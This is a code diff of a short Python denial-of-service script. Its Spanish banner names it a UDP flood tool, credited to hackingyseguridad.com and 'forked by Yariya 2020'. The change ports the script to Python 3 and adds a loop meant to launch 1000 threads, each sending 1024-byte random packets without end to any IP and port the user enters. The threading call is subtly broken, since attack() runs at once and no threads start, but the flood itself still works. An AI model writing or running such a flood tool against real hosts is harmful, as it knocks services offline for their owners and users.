@@ -1,14 +1,23 @@
 import socket
 import random
-print "##################################"
-print "# Envio paquetes UDP inundacion  #"
-print "# (c) hackingyseguridad.com 2017 #"
-print "# Ctrol+C para interrumpir envio #"
-print "##################################"
+import threading
+
+print ("##################################")
+print ("# Envio paquetes UDP inundacion  #")
+print ("# (c) hackingyseguridad.com 2017 #")
+print ("# Ctrol+C para interrumpir envio #")
+print ("##################################")
+print ("###    Forked by Yariya 2020   ###")
 sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-bytes=random._urandom(1024)
-ip=raw_input('IP_Destino_Target: ')
-port=input('Puerto: ')
-while 1:
-    sock.sendto(bytes,(ip,port))
-sent=sent+1
+
+ip=input('IP: ')
+port=input('Port: ')
+
+
+def attack():
+    packet = random._urandom(1024)
+    while 1:
+        sock.sendto(packet, (ip, int(port)))
+
+for x in range(1,1000):
+    threading.Thread(target=attack()).start()
